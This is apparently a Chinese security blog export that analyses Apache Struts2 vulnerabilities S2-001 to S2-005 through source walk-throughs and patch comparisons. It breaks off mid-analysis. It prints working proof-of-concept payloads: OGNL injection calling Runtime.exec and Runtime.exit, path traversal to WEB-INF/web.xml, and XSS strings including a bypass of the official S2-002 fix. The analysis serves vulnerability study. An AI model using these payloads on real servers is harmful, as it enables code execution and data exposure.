<p>POC：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/struts/..%<span class="number">252f</span>/</span><br><span class="line">/struts/..%<span class="number">252f</span>..%<span class="number">252f</span>..%<span class="number">252f</span>WEB-INF/web.xml</span><br></pre></td></tr></table></figure>

<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>加上了 cleanupPath、URL.getFile 和 endWith 来进行限制。</p>
<p><img src="/img/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201224120316800.png" alt="image-20201224120316800"></p>
<p><img src="/img/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201224120423548.png" alt="image-20201224120423548"></p>
<p><img src="/img/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201224121310332.png" alt="image-20201224121310332"></p>
<p><img src="/img/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201223105230910.png" alt="image-20201223105230910"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://aluvion.gitee.io/2020/07/16/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-004/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener">https://aluvion.gitee.io/2020/07/16/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-004/#%E5%89%8D%E8%A8%80</a></p>
<p><a href="https://xz.aliyun.com/t/7967" target="_blank" rel="noopener">https://xz.aliyun.com/t/7967</a></p>
<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-004" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-004</a></p>
]]></content>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2-003、005漏洞分析</title>
    <url>/2020/12/24/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="Struts2-003"><a href="#Struts2-003" class="headerlink" title="Struts2-003"></a>Struts2-003</h3><h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p>
<p>POC:</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">login</span><span class="selector-class">.action</span>?(<span class="string">'\u0023context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\u003dfalse'</span>)(bla)(bla)<span class="selector-tag">&amp;</span>(<span class="string">'\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'</span>calc\<span class="string">')'</span>)(bla)(bla)</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>s2-003漏洞的payload用到了特殊字符，这里使用低版本tomcat6来测试。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">tomcat高版本会严格按照 RFC <span class="number">3986</span>规范进行访问解析，而 RFC <span class="number">3986</span>规范定义了Url中只允许包含英文字母 a-zA-Z、数字<span class="number">0</span><span class="number">-9</span>、-_.~ <span class="number">4</span>个特殊字符以及所有保留字符(RFC3986中指定了以下字符为保留字符：! * ’ ( ) ; : @ &amp; = + $ , / ? # [ ])</span><br><span class="line"></span><br><span class="line">在高版本的tomcat，如果url中要使用下列字符，需要进行url编码，否则会返回<span class="number">400</span>状态码。</span><br><span class="line">^[]&#123;&#125;\|<span class="string">"&lt;&gt;`</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>根据官方概述，问题出现在ParameterInterceptors.java。</p>
<p>此时我们在ParametersInterceptor拦截器入口方法进行断点doIntercept()</p>
<p>在<code>getValueStack</code>之前，执行了一些初始化操作，将<code>xwork.MethodAccessor.denyMethodExecution</code>设置为<code>true</code>。为了能够调用方法，需要在poc中的第一部分将<code>denyMethodExecution</code>设置为<code>false</code>，之后才能任意代码执行。</p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222161256364.png" alt="image-20201222161256364"></p>
<p>跟入<code>setParameters(action, stack, parameters);</code>此部分开始通过迭代器取出一个个传入的参数，并进行处理。</p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222154340316.png" alt="image-20201222154340316"></p>
<p>跟入<code>acceptableName</code>发现<code>acceptableName</code> 方法判断参数是否含有非法字符，可以发现非法字符中包含 <code>#</code>号，所以我们的 <code>payload</code>需要将 <code>#</code> 号编码成 <code>\u0023</code> 。通过校验后，会调用 <code>setValue</code> 方法将值添加进值栈</p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222155111292.png" alt="image-20201222155111292"></p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222155058451.png" alt="image-20201222155058451"></p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222162610882.png" alt="image-20201222162610882"></p>
<p>跟入<code>setValue</code> 方法，该方法中调用了<code>Ognl.setValue()</code> </p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222154519290.png" alt="image-20201222154519290"></p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222160456612.png" alt="image-20201222160456612"></p>
<p><code>Ognl.setValue()</code> 方法中会调用 <code>compile</code> 方法对字符串进行解析，在解析字符串时，程序会对 <code>\u</code> 字符进行解码。</p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222160221068.png" alt="image-20201222160221068"></p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222174507709.png" alt="image-20201222174507709"></p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222174704079.png" alt="image-20201222174704079"></p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222181149389.png" alt="image-20201222181149389"></p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222182008083.png" alt="image-20201222182008083"></p>
<p>又会回到 <code>Ognl.setValue()</code> ，表达式的解析执行</p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222164908265.png" alt="image-20201222164908265"></p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222165844689.png" alt="image-20201222165844689"></p>
<p>对参数名特殊字符过滤不完善，通过<code>\u0023</code>(16进制的<code>#</code>)、八进制的<code>\43</code>，绕过正则表达式，从而执行了<code>OGNL</code>表达式.</p>
<h3 id="Struts2-005"><a href="#Struts2-005" class="headerlink" title="Struts2-005"></a>Struts2-005</h3><h4 id="漏洞概要-1"><a href="#漏洞概要-1" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-005</a></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">S2<span class="number">-005</span>漏洞的起源源于S2<span class="number">-003</span>(受影响版本: 低于Struts <span class="number">2.0</span><span class="number">.12</span>)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(u0023)或<span class="number">8</span>进制(<span class="number">43</span>)即绕过了安全限制，对于S2<span class="number">-003</span>漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这些选项打开，S2<span class="number">-003</span>的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上。—— 《白帽子讲Web安全》</span><br></pre></td></tr></table></figure>

<p>POC：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">login.action?('<span class="symbol">\u</span>0023_memberAccess[<span class="symbol">\'</span>allowStaticMethodAccess<span class="symbol">\'</span>]')(meh)=true&amp;(aaa)(('<span class="symbol">\u</span>0023context[<span class="symbol">\'</span>xwork.MethodAccessor.denyMethodExecution<span class="symbol">\'</span>]<span class="symbol">\u</span>003d<span class="symbol">\u</span>0023foo')(<span class="symbol">\u</span>0023foo<span class="symbol">\u</span>003dnew<span class="variable">%20java.lang.Boolean("false")))&amp;(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>S2-005 是对 S2-003 修复的绕过，对比一下 <code>ParametersInterceptor</code> 的源码</p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201224161108681.png" alt="image-20201224161108681"></p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201224161151927.png" alt="image-20201224161151927"></p>
<p>官方通过增加禁止静态方法调用 <code>allowStaticMethodAcces</code> 、类方法执行 <code>MethodAccessor.den yMethodExecution</code> 等安全配置来进行修复，我们可以利用 <code>OGNL</code> 表达式来进行操作更改值，从而进行一个绕过。</p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201224162439935.png" alt="image-20201224162439935"></p>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>使用了更加严格的正则 <code>[a-zA-Z0-9\\.\\]\\[\\(\\)_&#39;\\s]+</code> 来校验参数名的合法性。</p>
<p><img src="/img/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201224184426800.png" alt="image-20201224184426800"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://xz.aliyun.com/t/7966" target="_blank" rel="noopener">https://xz.aliyun.com/t/7966</a></p>
<p><a href="https://xz.aliyun.com/t/2323" target="_blank" rel="noopener">https://xz.aliyun.com/t/2323</a></p>
<p><a href="https://mp.weixin.qq.com/s/xaVxdYPRIhlxiFLy9WhUHA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/xaVxdYPRIhlxiFLy9WhUHA</a></p>
<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p>
]]></content>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2-002 漏洞分析</title>
    <url>/2020/12/24/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-002" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-002</a></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>通过官网的安全公告，我们大概知道问题是出在标签<code>&lt;s:url&gt;</code>和 <code>&lt;s:a&gt;</code>标签</p>
<p>中，如下是我们的<code>index.jsp</code>代码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;s2-002&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;h2&gt;s2-002 demo&lt;/h2&gt;</span><br><span class="line">  &lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/dispaly/WW/S2-002"</span>&gt;</span><br><span class="line">  &lt;/a&gt;https://cwiki.apache.org/confluence/dispaly/WW/S2-002 &lt;/p&gt;</span><br><span class="line">  &lt;s:url action="login" includeParams="all" &gt;&lt;/s:url&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>由于s2的标签库都是集成与<code>ComponentTagSupport</code>类，<code>doStartTag</code>方法也是在该类里实现，所以我们直接从<code>ComponentTagSupport</code>类<code>doStartTag</code>方法进行断点调试, 首先我们看一下<code>doStartTag</code>方法：</p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201220160944540.png" alt="image-20201220160944540"></p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201220161002678.png" alt="image-20201220161002678"></p>
<p>由于我们这里处理的是 <code>s:url</code> 标签，所以这里用来处理标签的组件 <code>this.component</code>为<code>org.apache.struts2.components.URL</code>类对象。我们跟进 <code>URL:start()</code>方法。</p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221141410686.png" alt="image-20201221141410686"></p>
<p>在 <code>URL:start()</code>方法中，我们看到当<code>includeParams=all</code>时，会调用 <code>mergeRequestParameters</code>方法。</p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221141714877.png" alt="image-20201221141714877"></p>
<p>在 <code>mergeRequestParameters</code>方法中，程序会将 <code>this.req.getParameterMap()</code>获得的键值对数据存入 <code>this.parameters</code>属性。</p>
<p><code>getParameterMap()</code>返回一个map类型的request参数</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http://192.168.174.1:8888/Struts2_demo_war_exploded/?<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么解析后的map就是 ： <code>key= &lt;script&gt;alert(1)&lt;/script&gt;、vaule = &quot;&quot;</code> 并未看到对参数进行任何过滤，</p>
<p>getParameterMap()方法并不会对数据进行任何处理。<a href="#demo">可见下文demo实例</a></p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221142411460.png" alt="image-20201221142411460"></p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221142719076.png" alt="image-20201221142719076"></p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221142946058.png" alt="image-20201221142946058"></p>
<p>最后进入<code>doEndTag</code>方法进行处理</p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221170346052.png" alt="image-20201221170346052"></p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221170317717.png" alt="image-20201221170317717"></p>
<p><code>determineActionURL</code>方法中调用了<code>URLHelper</code>类处理 <code>this.parameters</code> 数据并进行返回</p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221153821932.png" alt="image-20201221153821932"></p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221153301168.png" alt="image-20201221153301168"></p>
<p>将其写入，导致XSS漏洞。</p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221153500644.png" alt="image-20201221153500644"></p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222113854119.png" alt="image-20201222113854119"></p>
<p><code>includeParams=get</code>时并不能触发 XSS 漏洞。</p>
<p>主要原因在于：当<code>includeParams=all</code>时，会多执行一个<code>mergeRequestParameters</code> 方法，而该方法会将 <code>this.req.getParameterMap()</code>数据设置到<code>this.parameters</code> 。如果 <code>includeParams=get</code>，那么 <code>this.parameters</code>中的数据，仅是来自 <code>this.req.getQueryString()</code></p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222113001419.png" alt="image-20201222113001419"></p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222113440372.png" alt="image-20201222113440372"></p>
<p>而 <code>this.req.getParameterMap()</code>获得的数据会主动进行<code>URLdecode</code> ，但是<code>this.req.getQueryString()</code>不会。所以 <code>includeParams=get</code>时，返回的数据是被 <code>URLencode</code> 过的，因此不能触发 XSS 漏洞。<a href="#demo">可见下文demo实例</a></p>
<h4 id="demo实例"><a href="#demo实例" class="headerlink" title="demo实例"></a>demo实例</h4><p><span id="demo">demo实例</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(<span class="string">"/test"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getQueryString:"</span>+<span class="string">"\n"</span>+request.getQueryString());</span><br><span class="line">        Map&lt;String, String[]&gt; parameterMap = request.getParameterMap();</span><br><span class="line">        Iterator&lt;Map.Entry&lt;String, String[]&gt;&gt; iterator = parameterMap.entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">            Map.Entry&lt;String, String[]&gt; next = iterator.next();</span><br><span class="line">            System.out.println(<span class="string">"getParameterMap:"</span>+<span class="string">"\n"</span>+<span class="string">"key="</span>+next.getKey()+<span class="string">'\n'</span>+<span class="string">"value="</span>+next.getValue()[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201221180716399.png" alt="image-20201221180716399"></p>
<p>Poc:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">?<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>根据公告，我们需要升级到Struts 2.0.11.1版本，未真正修复，仅仅是对script标签进行替换，仍然可以对其进行绕过</p>
<p><img src="/img/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201222111554160.png" alt="image-20201222111554160"></p>
<p>bypass POC:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">?<span class="tag">&lt;<span class="name">script</span> <span class="attr">1</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">?<span class="tag">&lt;<span class="name">strong</span>&gt;</span>script<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-002" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-002</a></p>
<p><a href="https://xz.aliyun.com/t/7916" target="_blank" rel="noopener">https://xz.aliyun.com/t/7916</a></p>
<p><a href="https://dean2021.github.io/posts/s2-002/" target="_blank" rel="noopener">https://dean2021.github.io/posts/s2-002/</a></p>
]]></content>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2-001 漏洞分析</title>
    <url>/2020/12/24/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在HTTP请求被Struts2处理时，首先读取<code>web.xml</code>文件，这个是网站配置文件，里面有个过滤器，叫：<code>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</code>然后这个过滤器执行完之后，会经过一系列的拦截器，这些拦截器可以是默认的，也是可以用户自定义的。</p>
<p>Struts2请求处理流程（来自攻击JavaWeb应用[5]）：</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225113205710.png" alt="image-20201225113205710"></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">这里科普几个概念</span><br><span class="line">拦截器概念</span><br><span class="line">拦截器(Interceptor)是Struts2框架的核心功能之一,Struts <span class="number">2</span>是一个基于MVC设计模式的开源框架, [<span class="number">3</span>]  主要完成请求参数的解析、将页面表单参数赋给值栈中相应属性、执行功能检验、程序异常调试等工作。Struts2拦截器是一种可插拔策略,实现了面向切面的组件开发,当需要扩展功能时,只需要提供对应拦截器,并将它配置在Struts2容器中即可,如果不需要该功能时,也只需要在配置文件取消该拦截器的设置,整个过程不需要用户添加额外的代码。拦截器中更为重要的概念即拦截器栈(Interceptor Stack),拦截器栈就是Struts2中的拦截器按一定的顺序组成的一个线性链,页面发出请求,访问Action对象或方法时,栈中被设置好的拦截器就会根据堆栈的原理顺序的被调用。 </span><br><span class="line"></span><br><span class="line">说人话：struts2是框架，封装的功能都是在拦截器里面，封装很多功能，有很多拦截器，不是每次这些拦截器都执行，每次执行默认的拦截器，默认拦截器位置struts2-core<span class="number">-2.0</span><span class="number">.8</span>.jar!\struts-<span class="section">default</span>.xml，在执行拦截器，执行过程使用aop思想，在action没有直接调用拦截器方法，而是使用配置文件进行操作，在执行拦截器时候，执行很多的拦截器，这个过程使用责任链模式，例如：执行三个拦截器，执行拦截器<span class="number">1</span>-&gt;执行完放行-&gt;执行拦截器<span class="number">2</span>-&gt;执行完放行-&gt;执行拦截器<span class="number">3</span>-&gt;执行完放行-&gt;执行action方法。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">拦截器什么时候执行呢？</span><br><span class="line">在action对象之后，action方法执行之前</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>例如下图<code>struts.xml</code>中的<code>package</code> 继承了<code>struts</code>默认的拦截器(struts-default)，具体可以查看<code>struts-default.xml</code>文件。</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/simage-20201218102840514.png" alt="image-20201218102840514"></p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218104357386.png" alt="image-20201218104357386"></p>
<p>这里我们要关注<code>params</code>这个拦截器，代码位置：<code>xwork-2.0.3.jar!\com\opensymphony\xwork2\interceptor\ParametersInterceptor.class</code></p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218111703265.png" alt="image-20201218111703265"></p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218113626884.png" alt="image-20201218113626884"></p>
<p>经过一系列的拦截器处理后，数据会成功进入实际业务 <code>Action</code>。程序会根据<code>Action</code> 处理的结果，选择对应的 <code>JSP</code>视图进行展示，并对视图中的 <code>Struts2</code> 标签进行处理。</p>
<p>在本实例中<code>Action</code>处理用户登录是返回<code>error</code></p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218144456659.png" alt="image-20201218144456659"></p>
<p>根据返回结果以及先前在<code>struts.xml</code>中定义的视图，程序将开始处理 <code>index.jsp</code></p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218144537239.png" alt="image-20201218144537239"></p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218144810408.png" alt="image-20201218144810408"></p>
<p>从代码里我们可以看得到，<code>struts2</code>使用了自定义标签库，也就是<code>/struts-tags</code>, 通过阅读 <code>struts2-core-2.0.8.jar!/META-INF/struts-tags.tld</code>文件，我们得知这个<code>textfield</code>标签实现类是<code>org.apache.struts2.views.jsp.ui.TextFieldTag</code></p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201220153156591.png" alt="image-20201220153156591"></p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201220153226282.png" alt="image-20201220153226282"></p>
<p>了解jsp自定义标签的同学应该知道，这时候我们需要找的是<code>doStartTag</code>方法，因为解析标签是从这个方法开始，具体可以参考 <a href="https://blog.csdn.net/zljjava/article/details/17420809" target="_blank" rel="noopener">TagSupport详解</a>, 通过在<code>TextFieldTag</code>类的<code>ComponentTagSupport</code>父类我们找到<code>doStartTag</code>方法</p>
<p>当在<code>JSP</code> 文件中遇到 <code>Struts2</code>标签 时，由于s2的标签库都是集成与<code>ComponentTagSupport</code>类，程序会先调用 <code>doStartTag</code> ，并将标签中的属性设置到 <code>TextFieldTag</code>对象相应属性中。</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218154513302.png" alt="image-20201218154513302"></p>
<p>最后，在遇到 <code>/&gt;</code>结束标签的时候调用 <code>doEndTag</code> 方法。</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218152120932.png" alt="image-20201218152120932"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">doEndTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.component.end(<span class="keyword">this</span>.pageContext.getOut(), <span class="keyword">this</span>.getBody());</span><br><span class="line">        <span class="keyword">this</span>.component = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们跟进<code>this.component.end</code>方法，该方法调用了 <code>this.evaluateParams();</code>方法来填充<code>JSP</code>中的动态数据。</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218152528873.png" alt="image-20201218152528873"></p>
<p>跟进<code>this.evaluateParams</code>方法，发现如果开启<code>OGNL</code>表达式支持(this.altSyntax())，会进行属性字段添加<code>OGNL</code>表达式字符(%{name})</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218152851979.png" alt="image-20201218152851979"></p>
<p>然后使用<code>findValue</code>方法从值栈中获得该表达式所对应的值，跟进<code>findValue</code>方法</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218153309872.png" alt="image-20201218153309872"></p>
<p><code>findValue</code>在开启了<code>altSyntax</code>且<code>toType</code>为<code>class.java.lang.string</code>时调用<code>TextParseUtil.translateVariables</code>方法</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218153519551.png" alt="image-20201218153519551"></p>
<p>跟进该方法</p>
